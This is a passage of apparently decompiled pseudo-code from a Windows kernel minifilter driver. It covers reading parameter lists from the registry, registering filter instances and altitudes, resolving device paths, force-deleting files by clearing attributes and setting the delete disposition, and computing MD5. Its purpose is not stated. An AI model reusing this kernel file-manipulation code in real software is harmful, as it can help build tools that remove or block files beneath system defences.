            return result;
          }
          FltUnregisterFilter(Filter);
        }
      }
      sub_140002C7C((void *)qword_14000A3B0);
      sub_140002C7C((void *)qword_14000A3B8);
      return v5;
    }
  }
  return result;
}


// Function: sub_140003914 at 0x140003914
__int64 __fastcall sub_140003914(__int64 a1)
{
  USHORT *v2; // rcx
  unsigned int v3; // edx
  unsigned __int16 v4; // r14
  USHORT v5; // di
  USHORT *v6; // rbx
  __int64 v7; // r8
  USHORT *v8; // rcx
  unsigned int v9; // edx
  unsigned __int16 v10; // si
  USHORT v11; // di
  USHORT *v12; // rbx
  __int64 v13; // r8
  UNICODE_STRING String2; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v16; // [rsp+68h] [rbp+38h] BYREF
  int v17; // [rsp+70h] [rbp+40h] BYREF
  USHORT *v18; // [rsp+78h] [rbp+48h] BYREF

  v18 = 0LL;
  v16 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters4", &v18, &v16) < 0 )
    goto LABEL_10;
  if ( v16 > 4 )
  {
    v2 = v18;
    v3 = v16 - 2;
    v16 -= 2;
    v4 = 0;
    v5 = *v18;
    v6 = v18 + 1;
    if ( !*v18 )
      goto LABEL_8;
    while ( 1 )
    {
      v7 = *v6;
      if ( v3 < (unsigned __int64)(v7 + 2) )
        break;
      *(_QWORD *)&String2.Length = 0LL;
      String2.Buffer = v6 + 1;
      v16 = -2 - v7 + v3;
      String2.MaximumLength = *v6;
      String2.Length = String2.MaximumLength;
      sub_14000305C(&String2, (__int64)&v17);
      ++v4;
      v6 = (USHORT *)((char *)v6 + *v6 + 2);
      if ( v4 >= v5 )
        break;
      v3 = v16;
    }
  }
  v2 = v18;
LABEL_8:
  if ( v2 )
    sub_140001DD4(v2);
LABEL_10:
  v18 = 0LL;
  v16 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters5", &v18, &v16) < 0 )
    return 0LL;
  if ( v16 > 4 )
  {
    v8 = v18;
    v9 = v16 - 2;
    v16 -= 2;
    v10 = 0;
    v11 = *v18;
    v12 = v18 + 1;
    if ( !*v18 )
      goto LABEL_17;
    while ( 1 )
    {
      v13 = *v12;
      if ( v9 < (unsigned __int64)(v13 + 2) )
        break;
      *(_QWORD *)&String2.Length = 0LL;
      String2.Buffer = v12 + 1;
      v16 = -2 - v13 + v9;
      String2.MaximumLength = *v12;
      String2.Length = String2.MaximumLength;
      sub_140003108(&String2, &v17);
      ++v10;
      v12 = (USHORT *)((char *)v12 + *v12 + 2);
      if ( v10 >= v11 )
        break;
      v9 = v16;
    }
  }
  v8 = v18;
LABEL_17:
  if ( v8 )
    sub_140001DD4(v8);
  return 0LL;
}


// Function: sub_140003AA4 at 0x140003AA4
__int64 __fastcall sub_140003AA4(__int64 a1, _WORD *a2)
{
  NTSTATUS RegistryKey; // ebx
  const wchar_t *v5; // rcx
  wchar_t *v6; // r14
  __int16 v7; // ax
  __int64 v8; // rdi
  __int64 v9; // rax
  int v11; // [rsp+30h] [rbp-D0h] BYREF
  __int128 v12; // [rsp+38h] [rbp-C8h] BYREF
  WCHAR Path[264]; // [rsp+50h] [rbp-B0h] BYREF
  _WORD ValueData[264]; // [rsp+260h] [rbp+160h] BYREF

  RegistryKey = -1073741823;
  sub_140007D40(ValueData, 0LL, 520LL);
  v12 = 0LL;
  if ( a1 )
  {
    v5 = *(const wchar_t **)(a1 + 8);
    if ( v5 )
    {
      if ( *(_WORD *)a1 )
      {
        if ( a2 )
        {
          if ( *a2 )
          {
            v6 = wcsrchr(v5, 0x5Cu) + 1;
            if ( MmIsAddressValid(v6) )
            {
              v7 = *(_WORD *)a1 - (_WORD)v6;
              *((_QWORD *)&v12 + 1) = v6;
              LOWORD(v12) = *(_WORD *)(a1 + 8) + v7;
              WORD1(v12) = v12;
              sub_140007D40(Path, 0LL, 520LL);
              RegistryKey = sub_140003D4C(Path, 520LL, L"%wZ\\Instances", &v12);
              if ( RegistryKey >= 0 )
              {
                RegistryKey = RtlCreateRegistryKey(1u, Path);
                if ( RegistryKey >= 0 )
                {
                  RegistryKey = sub_140003D4C(ValueData, 520LL, L"%wZ Instance", &v12);
                  if ( RegistryKey >= 0 )
                  {
                    v8 = -1LL;
                    v9 = -1LL;
                    do
                      ++v9;
                    while ( ValueData[v9] );
                    RegistryKey = RtlWriteRegistryValue(1u, Path, L"DefaultInstance", 1u, ValueData, 2 * v9 + 2);
                    if ( RegistryKey >= 0 )
                    {
                      sub_140007D40(Path, 0LL, 520LL);
                      RegistryKey = sub_140003D4C(Path, 520LL, L"%wZ\\Instances\\%wZ Instance", &v12, &v12);
                      if ( RegistryKey >= 0 )
                      {
                        RegistryKey = RtlCreateRegistryKey(1u, Path);
                        if ( RegistryKey >= 0 )
                        {
                          do
                            ++v8;
                          while ( a2[v8] );
                          RegistryKey = RtlWriteRegistryValue(1u, Path, L"Altitude", 1u, a2, 2 * v8 + 2);
                          if ( RegistryKey >= 0 )
                          {
                            v11 = 0;
                            return (unsigned int)RtlWriteRegistryValue(1u, Path, L"Flags", 4u, &v11, 4u);
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return (unsigned int)RegistryKey;
}


// Function: sub_140003D4C at 0x140003D4C
__int64 sub_140003D4C(wchar_t *a1, unsigned __int64 a2, const wchar_t *a3, ...)
{
  unsigned __int64 v3; // rdx
  unsigned int v5; // edi
  unsigned __int64 v6; // rsi
  int v7; // eax
  va_list Args; // [rsp+68h] [rbp+20h] BYREF

  va_start(Args, a3);
  v3 = a2 >> 1;
  if ( v3 - 1 <= 0x7FFFFFFE )
  {
    v6 = v3 - 1;
    v5 = 0;
    v7 = vsnwprintf(a1, v3 - 1, a3, Args);
    if ( v7 < 0 || v7 > v6 )
    {
      v5 = -2147483643;
    }
    else if ( v7 != v6 )
    {
      return v5;
    }
    a1[v6] = 0;
    return v5;
  }
  v5 = -1073741811;
  if ( v3 )
    *a1 = 0;
  return v5;
}


// Function: sub_140003DBC at 0x140003DBC
bool __fastcall sub_140003DBC(void *a1)
{
  union _LARGE_INTEGER Timeout; // [rsp+48h] [rbp+10h] BYREF

  Timeout.QuadPart = 0LL;
  return KeWaitForSingleObject(a1, Executive, 0, 0, &Timeout) == 0;
}


// Function: sub_140003DE8 at 0x140003DE8
void __fastcall sub_140003DE8(void *a1)
{
  ExFreePoolWithTag(a1, 0x72706C48u);
}


// Function: sub_140003DF4 at 0x140003DF4
NTSTATUS __fastcall sub_140003DF4(__int64 a1)
{
  union _LARGE_INTEGER Interval; // [rsp+30h] [rbp+8h] BYREF

  Interval.QuadPart = -10000 * a1;
  return KeDelayExecutionThread(0, 0, &Interval);
}


// Function: sub_140003E18 at 0x140003E18
NTSTATUS __fastcall sub_140003E18(UNICODE_STRING *String2, PUNICODE_STRING Destination)
{
  int v4; // ebx
  int v5; // edx
  WCHAR *Buffer; // r10
  USHORT v7; // ax
  USHORT v8; // cx
  NTSTATUS result; // eax
  NTSTATUS v10; // r14d
  int Length; // edx
  UNICODE_STRING *p_Source; // rdx
  BOOLEAN v13; // al
  USHORT v14; // dx
  unsigned __int64 v15; // rcx
  USHORT v16; // ax
  NTSTATUS appended; // eax
  UNICODE_STRING Source; // [rsp+20h] [rbp-E0h] BYREF
  UNICODE_STRING LinkHandle; // [rsp+30h] [rbp-D0h] BYREF
  UNICODE_STRING v20; // [rsp+40h] [rbp-C0h] BYREF
  UNICODE_STRING v21; // [rsp+50h] [rbp-B0h] BYREF
  ULONG ReturnedLength; // [rsp+60h] [rbp-A0h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+68h] [rbp-98h] BYREF
  UNICODE_STRING String1; // [rsp+78h] [rbp-88h] BYREF
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+88h] [rbp-78h] BYREF
  char v26; // [rsp+C0h] [rbp-40h] BYREF

  RtlInitUnicodeString(&DestinationString, L"\\??\\");
  RtlInitUnicodeString(&String1, L"\\Device\\");
  RtlInitUnicodeString(&v20, L"\\SystemRoot\\");
  v4 = 0;
  if ( RtlPrefixUnicodeString(&DestinationString, String2, 1u) )
  {
    v5 = 0;
    Buffer = String2->Buffer;
    v7 = String2->Length - DestinationString.Length;
    v8 = v7;
    Source.Length = v7;
    Source.Buffer = (WCHAR *)((char *)Buffer + DestinationString.Length);
    if ( v7 )
    {
      while ( *(WCHAR *)((char *)&Buffer[v5] + DestinationString.Length) != 92 )
      {
        if ( ++v5 >= (unsigned int)v7 )
          goto LABEL_7;
      }
      v8 = 2 * v5;
    }
LABEL_7:
    if ( !v8 )
      return -1073741585;
    Source.Buffer = Buffer;
    Source.Length = DestinationString.Length + v8;
    Source.MaximumLength = DestinationString.Length + v8;
    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0LL;
    ObjectAttributes.Attributes = 512;
    ObjectAttributes.ObjectName = &Source;
    *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0LL;
    result = ZwOpenSymbolicLinkObject((PHANDLE)&LinkHandle, 0x80000000, &ObjectAttributes);
    if ( result >= 0 )
    {
      v10 = ZwQuerySymbolicLinkObject(*(HANDLE *)&LinkHandle.Length, Destination, &ReturnedLength);
      ZwClose(*(HANDLE *)&LinkHandle.Length);
      if ( v10 < 0 )
        return v10;
      Length = String2->Length;
      if ( Length + Destination->Length - (unsigned int)Source.Length > Destination->MaximumLength )
        return -2147483643;
      Source.Buffer = (PWSTR)((char *)String2->Buffer + Source.Length);
      Source.Length = Length - Source.Length;
      Source.MaximumLength = Source.Length;
      p_Source = &Source;
      goto LABEL_15;
    }
  }
  else
  {
    v13 = RtlPrefixUnicodeString(&String1, String2, 1u);
    p_Source = String2;
    if ( v13 )
    {
      Destination->Length = 0;
LABEL_15:
      result = RtlAppendUnicodeStringToString(Destination, p_Source);
      if ( result >= 0 )
        return 0;
      return result;
    }
    if ( RtlPrefixUnicodeString(&v20, String2, 1u) )
    {
      LinkHandle.Buffer = v20.Buffer;
      *(_DWORD *)&Source.Length = 0x800000;
      LinkHandle.Length = v20.Length - 2;
      LinkHandle.MaximumLength = v20.Length - 2;
      Source.Buffer = (PWSTR)&v26;
      result = sub_1400043D4(&LinkHandle, &Source);
      if ( result >= 0 )
      {
        v14 = Source.Length;
        v21.Length = 0;
        v15 = ((unsigned __int64)Source.Length - 2) >> 1;
        if ( (v15 & 0x8000u) == 0LL )
        {
          while ( Source.Buffer[(unsigned __int16)v15] != 92 )
          {
            LOWORD(v15) = v15 - 1;
            if ( (v15 & 0x8000u) != 0LL )
              goto LABEL_26;
          }
          v21.Buffer = &Source.Buffer[(unsigned __int16)v15];
          Source.Length = 2 * v15;
          v21.Length = v14 - 2 * v15;
          v21.MaximumLength = v21.Length;
        }
LABEL_26:
        result = sub_1400043D4(&Source, Destination);
        if ( result >= 0 )
        {
          v16 = String2->Length - v20.Length + 2;
          LinkHandle.Buffer = (PWSTR)((char *)String2->Buffer + v20.Length - 2);
          LinkHandle.Length = v16;
          LinkHandle.MaximumLength = v16;
          result = RtlAppendUnicodeStringToString(Destination, &v21);
          if ( result >= 0 )
          {
            appended = RtlAppendUnicodeStringToString(Destination, &LinkHandle);
            if ( appended < 0 )
              return appended;
            return v4;
          }
        }
      }
    }
    else
    {
      return -1073741811;
    }
  }
  return result;
}


// Function: sub_140004110 at 0x140004110
NTSTATUS __fastcall sub_140004110(__int128 *a1)
{
  __int128 v1; // xmm0
  NTSTATUS result; // eax
  NTSTATUS v3; // ebx
  char v4[8]; // [rsp+60h] [rbp-39h] BYREF
  void *FileHandle; // [rsp+68h] [rbp-31h] BYREF
  struct _IO_STATUS_BLOCK IoStatusBlock; // [rsp+70h] [rbp-29h] BYREF
  struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+80h] [rbp-19h] BYREF
  __int128 v8; // [rsp+B0h] [rbp+17h] BYREF
  _OWORD FileInformation[2]; // [rsp+C0h] [rbp+27h] BYREF
  __int64 v10; // [rsp+E0h] [rbp+47h]

  v1 = *a1;
  ObjectAttributes.RootDirectory = 0LL;
  v8 = v1;
  ObjectAttributes.Length = 48;
  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0LL;
  ObjectAttributes.Attributes = 576;
  ObjectAttributes.ObjectName = (PUNICODE_STRING)&v8;
  result = ZwCreateFile(&FileHandle, 0x110002u, &ObjectAttributes, &IoStatusBlock, 0LL, 0x80u, 7u, 1u, 0x1020u, 0LL, 0);
  if ( result >= 0 )
    goto LABEL_5;
  if ( result == -1073741790 )
  {
    result = ZwCreateFile(&FileHandle, 0x100180u, &ObjectAttributes, &IoStatusBlock, 0LL, 0x80u, 7u, 1u, 0x20u, 0LL, 0);
    if ( result >= 0 )
    {
      v10 = 0LL;
      memset(FileInformation, 0, sizeof(FileInformation));
      ZwQueryInformationFile(FileHandle, &IoStatusBlock, FileInformation, 0x28u, FileBasicInformation);
      LODWORD(v10) = 128;
      ZwSetInformationFile(FileHandle, &IoStatusBlock, FileInformation, 0x28u, FileBasicInformation);
      ZwClose(FileHandle);
      result = ZwCreateFile(
                 &FileHandle,
                 0x110002u,
                 &ObjectAttributes,
                 &IoStatusBlock,
                 0LL,
                 0x80u,
                 7u,
                 1u,
                 0x1020u,
                 0LL,
                 0);
      if ( result >= 0 )
      {
LABEL_5:
        v4[0] = 1;
        v3 = ZwSetInformationFile(FileHandle, &IoStatusBlock, v4, 1u, FileDispositionInformation);
        ZwClose(FileHandle);
        return v3;
      }
    }
  }
  return result;
}


// Function: sub_140004304 at 0x140004304
NTSTATUS __fastcall sub_140004304(SYSTEM_INFORMATION_CLASS SystemInformationClass, _QWORD *a2, _QWORD *a3)
{
  void *v5; // rbx
  NTSTATUS result; // eax
  ULONG v8; // eax
  PVOID PoolWithTag; // rax
  NTSTATUS SystemInformation; // eax
  NTSTATUS v11; // edi
  __int64 v12; // rax
  ULONG ReturnLength[10]; // [rsp+20h] [rbp-28h] BYREF
  ULONG SystemInformationLength; // [rsp+68h] [rbp+20h] BYREF

  v5 = 0LL;
  SystemInformationLength = 0;
  ReturnLength[0] = 0;
  result = ZwQuerySystemInformation(SystemInformationClass, 0LL, 0, &SystemInformationLength);
  if ( result == -1073741820 )
  {
    do
    {
      v8 = ReturnLength[0] + SystemInformationLength;
      SystemInformationLength += ReturnLength[0];
      if ( v5 )
      {
        ExFreePoolWithTag(v5, 0x72706C48u);
        v8 = SystemInformationLength;
      }
      PoolWithTag = ExAllocatePoolWithTag(NonPagedPool, v8, 0x72706C48u);
      v5 = PoolWithTag;
      if ( !PoolWithTag )
        return -1073741790;
      SystemInformation = ZwQuerySystemInformation(
                            SystemInformationClass,
                            PoolWithTag,
                            SystemInformationLength,
                            ReturnLength);
      v11 = SystemInformation;
    }
    while ( SystemInformation == -1073741820 );
    if ( SystemInformation >= 0 )
    {
      v12 = SystemInformationLength;
      *a2 = v5;
      *a3 = v12;
    }
    else
    {
      ExFreePoolWithTag(v5, 0x72706C48u);
    }
    return v11;
  }
  return result;
}


// Function: sub_1400043D4 at 0x1400043D4
NTSTATUS __fastcall sub_1400043D4(struct _UNICODE_STRING *a1, struct _UNICODE_STRING *a2)
{
  NTSTATUS result; // eax
  NTSTATUS v4; // ebx
  struct _OBJECT_ATTRIBUTES v5; // [rsp+20h] [rbp-38h] BYREF
  ULONG ReturnedLength; // [rsp+60h] [rbp+8h] BYREF
  HANDLE LinkHandle; // [rsp+70h] [rbp+18h] BYREF

  v5.RootDirectory = 0LL;
  v5.ObjectName = a1;
  v5.Length = 48;
  v5.Attributes = 512;
  *(_OWORD *)&v5.SecurityDescriptor = 0LL;
  result = ZwOpenSymbolicLinkObject(&LinkHandle, 0x80000000, &v5);
  if ( result >= 0 )
  {
    v4 = ZwQuerySymbolicLinkObject(LinkHandle, a2, &ReturnedLength);
    ZwClose(LinkHandle);
    return v4;
  }
  return result;
}


// Function: sub_140004440 at 0x140004440
__int64 __fastcall sub_140004440(const wchar_t *a1)
{
  unsigned int v1; // ebx
  int v3; // [rsp+48h] [rbp+10h] BYREF

  v1 = 0;
  v3 = 0;
  if ( swscanf_s(a1, L"%hhu.%hhu.%hhu.%hhu", &v3, (char *)&v3 + 1, (char *)&v3 + 2, (char *)&v3 + 3) == 4 )
    return (unsigned __int8)v3 | ((BYTE1(v3) | (HIWORD(v3) << 8)) << 8);
  return v1;
}


// Function: sub_1400044A4 at 0x1400044A4
__int64 __fastcall sub_1400044A4(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  _BYTE *v5; // rcx
  _DWORD v6[56]; // [rsp+20h] [rbp-F8h] BYREF

  v6[0] = 0;
  v6[1] = 0;
  v6[2] = 1732584193;
  v6[3] = -271733879;
  v6[4] = -1732584194;
  v6[5] = 271733878;
  sub_1400050C8(v6, a1, a2);
  sub_140004580(v6, a3);
  result = 216LL;
  v5 = v6;
  do
  {
    *v5++ = 0;
    --result;
  }
  while ( result );
  return result;
}


// Function: sub_140004538 at 0x140004538
__int64 __fastcall sub_140004538(__int64 a1, __int64 a2, __int64 a3)
{
  _BYTE v5[16]; // [rsp+20h] [rbp-28h] BYREF

  sub_1400044A4(a1, a2, (__int64)v5);
  return sub_140007880(v5, a3, 16LL);
}


// Function: sub_140004580 at 0x140004580
char __fastcall sub_140004580(int *a1, __int64 a2)
{
  int v2; // r10d
  int v5; // r9d
  int v6; // r8d
  __int16 v7; // ax
  unsigned int v8; // r10d
  __int64 v9; // r8
  char result; // al
  _BYTE v11[4]; // [rsp+20h] [rbp-18h] BYREF
  int v12; // [rsp+24h] [rbp-14h]

  v2 = *a1;
  v5 = *(__int64 *)a1 >> 29;
  v6 = 8 * *a1;
  v11[0] = 8 * *a1;
  v7 = 8 * v2;
  v8 = v2 & 0x3F;
  v11[1] = HIBYTE(v7);
  v11[2] = BYTE2(v6);
  v11[3] = HIBYTE(v6);
  v9 = 120 - v8;
  v12 = v5;
  if ( v8 < 0x38 )
    v9 = 56 - v8;
  sub_1400050C8(a1, &unk_140009430, v9);
  sub_1400050C8(a1, v11, 8LL);
  *(_WORD *)a2 = __PAIR16__(BYTE1(a1[2]), *((_BYTE *)a1 + 8));
  *(_BYTE *)(a2 + 2) = *((_BYTE *)a1 + 10);
  *(_BYTE *)(a2 + 3) = *((_BYTE *)a1 + 11);
  *(_WORD *)(a2 + 4) = __PAIR16__(BYTE1(a1[3]), *((_BYTE *)a1 + 12));
  *(_BYTE *)(a2 + 6) = *((_BYTE *)a1 + 14);
  *(_BYTE *)(a2 + 7) = *((_BYTE *)a1 + 15);
  *(_WORD *)(a2 + 8) = __PAIR16__(BYTE1(a1[4]), *((_BYTE *)a1 + 16));
  *(_BYTE *)(a2 + 10) = *((_BYTE *)a1 + 18);
  *(_BYTE *)(a2 + 11) = *((_BYTE *)a1 + 19);
  *(_WORD *)(a2 + 12) = __PAIR16__(BYTE1(a1[5]), *((_BYTE *)a1 + 20));
  *(_BYTE *)(a2 + 14) = *((_BYTE *)a1 + 22);
  result = *((_BYTE *)a1 + 23);
  *(_BYTE *)(a2 + 15) = result;
  return result;
}


// Function: sub_1400046C0 at 0x1400046C0
__int64 __fastcall sub_1400046C0(_DWORD *a1, unsigned __int8 *a2)
{
  int v2; // ebp
  int v3; // r14d
  int v4; // edi
  int v5; // r12d
  int v6; // ebx
  int v7; // r13d
  int v8; // r15d
  int v9; // esi
  int v10; // ecx
  int v11; // edx
  int v12; // r8d
  int v13; // r9d
  int v14; // r10d
  int v15; // ecx
  int v16; // edx
  int v17; // r8d
  int v18; // r9d
  int v19; // r10d
  int v20; // ecx
  int v21; // edx
  int v22; // r8d
  int v23; // r9d
  int v24; // r10d
  int v25; // ecx
  int v26; // edx
  int v27; // r8d
  int v28; // r9d
  int v29; // r10d
  int v30; // ecx
  int v31; // edx
  int v32; // r8d
  int v33; // r9d
  int v34; // r10d
  int v35; // ecx
  int v36; // edx
  int v37; // r11d
  int v38; // r8d
  int v39; // r9d
  int v40; // r10d
  int v41; // edx
  int v42; // r8d
  int v43; // r9d
  int v44; // r10d
  int v45; // r11d
  int v46; // edx
  int v47; // r8d
  int v48; // r9d
  int v49; // r10d
  int v50; // r11d
  int v51; // r8d
  int v52; // r9d
  int v53; // edx
  int v54; // r10d
  int v55; // ecx
  int v56; // r8d
  int v57; // r9d
  int v58; // edx
  int v59; // r10d
  int v60; // ecx
  int v61; // r8d
  int v62; // r9d
  int v63; // edx
  int v64; // r10d
  int v65; // ecx
  int v66; // r8d
  int v67; // r9d
  int v68; // r11d
  int v69; // r10d
  int v70; // r8d
  int v71; // edx
  int v72; // ecx
  __int64 result; // rax
  int v74; // [rsp+0h] [rbp-78h]
  int v75; // [rsp+4h] [rbp-74h]
  int v76; // [rsp+8h] [rbp-70h]
  int v77; // [rsp+Ch] [rbp-6Ch]
  int v78; // [rsp+10h] [rbp-68h]
  int v79; // [rsp+14h] [rbp-64h]
  int v80; // [rsp+18h] [rbp-60h]
  int v81; // [rsp+1Ch] [rbp-5Ch]
  int v82; // [rsp+20h] [rbp-58h]
  int v84; // [rsp+88h] [rbp+10h]
  int v85; // [rsp+90h] [rbp+18h]
  int v86; // [rsp+98h] [rbp+20h]

  v78 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v84 = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);
  v76 = a2[8] | ((a2[9] | ((a2[10] | (a2[11] << 8)) << 8)) << 8);
  v79 = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);
  v74 = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);
  v80 = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);
  v86 = a2[24] | ((a2[25] | (*((unsigned __int16 *)a2 + 13) << 8)) << 8);
  v2 = a2[28] | ((a2[29] | ((a2[30] | (a2[31] << 8)) << 8)) << 8);
  v85 = a2[32] | ((a2[33] | (*((unsigned __int16 *)a2 + 17) << 8)) << 8);
  v77 = a2[36] | ((a2[37] | ((a2[38] | (a2[39] << 8)) << 8)) << 8);
  v3 = a2[40] | ((a2[41] | (*((unsigned __int16 *)a2 + 21) << 8)) << 8);
  v75 = a2[44] | ((a2[45] | (*((unsigned __int16 *)a2 + 23) << 8)) << 8);
  v4 = a2[48] | ((a2[49] | (*((unsigned __int16 *)a2 + 25) << 8)) << 8);
  v5 = a2[52] | ((a2[53] | ((a2[54] | (a2[55] << 8)) << 8)) << 8);
  v6 = a2[56] | ((a2[57] | ((a2[58] | (a2[59] << 8)) << 8)) << 8);
  v7 = a1[3];
  v81 = a1[4];
  v8 = a1[2];
  v82 = a1[5];
  v9 = a2[60] | ((a2[61] | (*((unsigned __int16 *)a2 + 31) << 8)) << 8);
  v10 = v7 + __ROR4__(v8 + (v82 ^ v7 & (v81 ^ v82)) + v78 - 680876936, 25);
  v11 = v10 + __ROR4__(v84 + (v81 ^ v10 & (v7 ^ v81)) + v82 - 389564586, 20);
  v12 = v11 + __ROR4__(v76 + (v7 ^ v11 & (v10 ^ v7)) + v81 + 606105819, 15);
  v13 = v12 + __ROR4__(v79 + (v10 ^ v12 & (v10 ^ v11)) + v7 - 1044525330, 10);
  v14 = v13 + __ROR4__(v74 + (v11 ^ v13 & (v12 ^ v11)) + v10 - 176418897, 25);
  v15 = v14 + __ROR4__(v80 + (v12 ^ v14 & (v13 ^ v12)) + v11 + 1200080426, 20);
  v16 = v15 + __ROR4__(v86 + (v13 ^ v15 & (v14 ^ v13)) + v12 - 1473231341, 15);
  v17 = v16 + __ROR4__(v2 + (v14 ^ v16 & (v14 ^ v15)) + v13 - 45705983, 10);
  v18 = v17 + __ROR4__(v85 + (v15 ^ v17 & (v16 ^ v15)) + v14 + 1770035416, 25);
  v19 = v18 + __ROR4__(v77 + (v16 ^ v18 & (v17 ^ v16)) + v15 - 1958414417, 20);
  v20 = v19 + __ROR4__(v3 + (v17 ^ v19 & (v18 ^ v17)) + v16 - 42063, 15);
  v21 = v20 + __ROR4__(v75 + (v18 ^ v20 & (v18 ^ v19)) + v17 - 1990404162, 10);
  v22 = v21 + __ROR4__(v4 + (v19 ^ v21 & (v20 ^ v19)) + v18 + 1804603682, 25);
  v23 = v22 + __ROR4__(v5 + (v20 ^ v22 & (v21 ^ v20)) + v19 - 40341101, 20);
  v24 = v23 + __ROR4__(v6 + (v21 ^ v23 & (v22 ^ v21)) + v20 - 1502002290, 15);
  v25 = v24 + __ROR4__(v9 + (v22 ^ v24 & (v22 ^ v23)) + v21 + 1236535329, 10);
  v26 = v25 + __ROR4__(v84 + (v24 ^ v23 & (v25 ^ v24)) + v22 - 165796510, 27);
  v27 = v26 + __ROR4__(v86 + (v25 ^ v24 & (v26 ^ v25)) + v23 - 1069501632, 23);
  v28 = v27 + __ROR4__(v75 + (v26 ^ v25 & (v26 ^ v27)) + v24 + 643717713, 18);
  v29 = v28 + __ROR4__(v78 + (v27 ^ v26 & (v28 ^ v27)) + v25 - 373897302, 12);
  v30 = v29 + __ROR4__(v80 + (v28 ^ v27 & (v29 ^ v28)) + v26 - 701558691, 27);
  v31 = v30 + __ROR4__(v3 + (v29 ^ v28 & (v30 ^ v29)) + v27 + 38016083, 23);
  v32 = v31 + __ROR4__(v9 + (v30 ^ v29 & (v30 ^ v31)) + v28 - 660478335, 18);
  v33 = v32 + __ROR4__(v74 + (v31 ^ v30 & (v32 ^ v31)) + v29 - 405537848, 12);
  v34 = v33 + __ROR4__(v77 + (v32 ^ v31 & (v33 ^ v32)) + v30 + 568446438, 27);
  v35 = v34 + __ROR4__(v6 + (v33 ^ v32 & (v34 ^ v33)) + v31 - 1019803690, 23);
  v36 = v35 + __ROR4__(v79 + (v34 ^ v33 & (v34 ^ v35)) + v32 - 187363961, 18);
  v37 = v36 + __ROR4__(v85 + (v35 ^ v34 & (v36 ^ v35)) + v33 + 1163531501, 12);
  v38 = v37 + __ROR4__(v5 + (v36 ^ v35 & (v37 ^ v36)) + v34 - 1444681467, 27);
  v39 = v38 + __ROR4__(v76 + (v37 ^ v36 & (v38 ^ v37)) + v35 - 51403784, 23);
  v40 = v39 + __ROR4__(v2 + (v38 ^ v37 & (v38 ^ v39)) + v36 + 1735328473, 18);
  v41 = v40 + __ROR4__(v4 + (v39 ^ v38 & (v40 ^ v39)) + v37 - 1926607734, 12);
  v42 = v41 + __ROR4__(v80 + (v41 ^ v40 ^ v39) - 378558 + v38, 28);
  v43 = v42 + __ROR4__(v85 + (v42 ^ v41 ^ v40) - 2022574463 + v39, 21);
  v44 = v43 + __ROR4__(v75 + (v42 ^ v41 ^ v43) + 1839030562 + v40, 16);
  v45 = v44 + __ROR4__(v6 + (v42 ^ v44 ^ v43) + v41 - 35309556, 9);
  v46 = v45 + __ROR4__(v84 + (v45 ^ v44 ^ v43) + v42 - 1530992060, 28);
  v47 = v46 + __ROR4__(v74 + (v46 ^ v45 ^ v44) + v43 + 1272893353, 21);
  v48 = v47 + __ROR4__(v2 + (v46 ^ v45 ^ v47) + v44 - 155497632, 16);
  v49 = v48 + __ROR4__(v3 + (v46 ^ v48 ^ v47) + v45 - 1094730640, 9);
  v50 = v49 + __ROR4__(v5 + (v49 ^ v48 ^ v47) + v46 + 681279174, 28);
  v51 = v50 + __ROR4__(v78 + (v50 ^ v49 ^ v48) - 358537222 + v47, 21);
  v52 = v51 + __ROR4__(v79 + (v50 ^ v49 ^ v51) - 722521979 + v48, 16);
  v53 = v52 + __ROR4__(v86 + (v50 ^ v52 ^ v51) + v49 + 76029189, 9);
  v54 = v53 + __ROR4__(v50 + v77 + (v53 ^ v52 ^ v51) - 640364487, 28);
  v55 = v54 + __ROR4__(v4 + (v54 ^ v53 ^ v52) + v51 - 421815835, 21);
  v56 = v55 + __ROR4__(v9 + (v54 ^ v53 ^ v55) + v52 + 530742520, 16);
  v57 = v56 + __ROR4__(v76 + (v54 ^ v56 ^ v55) + v53 - 995338651, 9);
  v58 = v57 + __ROR4__(v78 + (v56 ^ (v57 | ~v55)) + v54 - 198630844, 26);
  v59 = v58 + __ROR4__(v2 + (v57 ^ (v58 | ~v56)) + v55 + 1126891415, 22);
  v60 = v59 + __ROR4__(v6 + (v58 ^ (v59 | ~v57)) + v56 - 1416354905, 17);
  v61 = v60 + __ROR4__(v80 + (v59 ^ (v60 | ~v58)) + v57 - 57434055, 11);
  v62 = v61 + __ROR4__(v4 + (v60 ^ (v61 | ~v59)) + v58 + 1700485571, 26);
  v63 = v62 + __ROR4__(v79 + (v61 ^ (v62 | ~v60)) + v59 - 1894986606, 22);
  v64 = v63 + __ROR4__(v3 + (v62 ^ (v63 | ~v61)) + v60 - 1051523, 17);
  v65 = v64 + __ROR4__(v84 + (v63 ^ (v64 | ~v62)) + v61 - 2054922799, 11);
  v66 = v65 + __ROR4__(v85 + (v64 ^ (v65 | ~v63)) + v62 + 1873313359, 26);
  v67 = v66 + __ROR4__(v63 + v9 + (v65 ^ (v66 | ~v64)) - 30611744, 22);
  v68 = v67 + __ROR4__(v86 + (v66 ^ (v67 | ~v65)) + v64 - 1560198380, 17);
  v69 = v68 + __ROR4__(v5 + (v67 ^ (v68 | ~v66)) + v65 + 1309151649, 11);
  v70 = v69 + __ROR4__(v74 + (v68 ^ (v69 | ~v67)) - 145523070 + v66, 26);
  v71 = v70 + __ROR4__(v75 + (v69 ^ (v70 | ~v68)) + v67 - 1120210379, 22);
  a1[2] = v8 + v70;
  v72 = v71 + __ROR4__(v68 + v76 + (v70 ^ (v71 | ~v69)) + 718787259, 17);
  a1[3] = v72 + v7 + __ROR4__(v77 + (v71 ^ (v72 | ~v70)) + v69 - 343485551, 11);
  a1[4] = v72 + v81;
  result = (unsigned int)(v71 + v82);
  a1[5] = result;
  return result;
}


